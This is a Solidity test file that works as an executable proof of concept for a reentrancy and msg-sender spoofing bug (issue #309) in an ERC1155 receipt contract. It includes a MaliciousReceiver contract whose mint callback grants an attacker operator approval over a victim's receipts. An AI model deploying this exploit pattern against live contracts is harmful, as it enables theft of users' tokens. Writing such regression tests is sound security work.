// SPDX-License-Identifier: LicenseRef-DCL-1.0
// SPDX-FileCopyrightText: Copyright (c) 2020 Rain Open Source Software Ltd
pragma solidity =0.8.25;

import {Receipt as ReceiptContract} from "src/concrete/receipt/Receipt.sol";
import {TestReceiptManager} from "test/concrete/TestReceiptManager.sol";
import {ReceiptFactoryTest} from "test/abstract/ReceiptFactoryTest.sol";
import {IERC1155Receiver} from "@openzeppelin-contracts-5.6.1/token/ERC1155/IERC1155Receiver.sol";
import {IERC1155} from "@openzeppelin-contracts-5.6.1/token/ERC1155/IERC1155.sol";

/// @title MaliciousReceiver
/// @notice An ERC1155 receiver that, during the acceptance callback fired by
/// `_mint`, re-enters the receipt and grants `attacker` operator approval.
/// Because `managerMint` holds `withSender(sender)` for the whole call, the
/// receipt's `_msgSender()` returns the spoofed depositor at callback time, so
/// the approval is recorded as if the depositor authorized it.
contract MaliciousReceiver is IERC1155Receiver {
    IERC1155 internal immutable iReceipt;
    address internal immutable iAttacker;

    constructor(IERC1155 receipt, address attacker) {
        iReceipt = receipt;
        iAttacker = attacker;
    }

    /// Re-enters the receipt mid-mint to grant the attacker operator approval.
    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4) {
        iReceipt.setApprovalForAll(iAttacker, true);
        return IERC1155Receiver.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        pure
        returns (bytes4)
    {
        return IERC1155Receiver.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }
}

/// @title ReceiptMsgSenderSpoofTest
/// @notice Demonstrates issue #309: ERC1155 acceptance callback enables
/// persistent operator approval via `_msgSender` spoofing.
contract ReceiptMsgSenderSpoofTest is ReceiptFactoryTest {
    /// During `managerMint(victim, maliciousReceiver, ...)` the `withSender`
    /// modifier sets the receipt's stored sender to `victim` for the whole
    /// call. `_mint` then fires `onERC1155Received` on the malicious receiver,
    /// which calls `setApprovalForAll(attacker, true)`. The receipt's
    /// `_msgSender()` returns the spoofed `victim`, so the approval is recorded
    /// as `isApprovedForAll[victim][attacker] == true` — an approval the victim
    /// never made, letting the attacker drain all of the victim's receipts and
    /// block redemption of the underlying shares/assets.
    ///
    /// This test asserts the (currently buggy) spoofed approval IS granted, so
    /// it passes against the vulnerable code and serves as an executable PoC for
    /// #309. When #309 is fixed the assertions should be inverted: the callback
    /// must observe the malicious receiver as `msg.sender`, so the victim must
    /// NOT end up approving the attacker.
    function testReceiptMsgSenderSpoofGrantsOperatorApproval(uint256 id, uint256 amount, bytes memory data) external {
        amount = bound(amount, 1, type(uint256).max);

        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");

        TestReceiptManager testManager = new TestReceiptManager();
        ReceiptContract receipt =
            ReceiptContract(iFactory.clone(address(iReceiptImplementation), abi.encode(address(testManager))));

        MaliciousReceiver maliciousReceiver = new MaliciousReceiver(IERC1155(address(receipt)), attacker);

        // The mint transfers from address(0) to the malicious receiver; both
        // must be authorized for `_update` to pass.
        testManager.setFrom(address(0));
        testManager.setTo(address(maliciousReceiver));

        // The victim has not approved the attacker before the deposit.
        assertFalse(receipt.isApprovedForAll(victim, attacker), "precondition: no approval");

        // The vault calls managerMint(victim, maliciousReceiver, ...) when the
        // victim deposits with the malicious contract as `receiver`. The receipt
        // sender is the victim (TestReceiptManager forwards its own msg.sender).
        vm.prank(victim);
        testManager.managerMint(receipt, address(maliciousReceiver), id, amount, data);

        // BUG (#309): the malicious receiver's callback granted the attacker
        // operator approval over the VICTIM's receipts, spoofed as the victim.
        assertTrue(
            receipt.isApprovedForAll(victim, attacker),
            "victim's identity was spoofed to grant the attacker operator approval"
        );

        // The attacker did NOT receive the approval under its own identity — the
        // whole point is that it was attributed to the victim instead.
        assertFalse(
            receipt.isApprovedForAll(address(maliciousReceiver), attacker),
            "approval was attributed to the victim, not the malicious receiver"
        );
    }
}
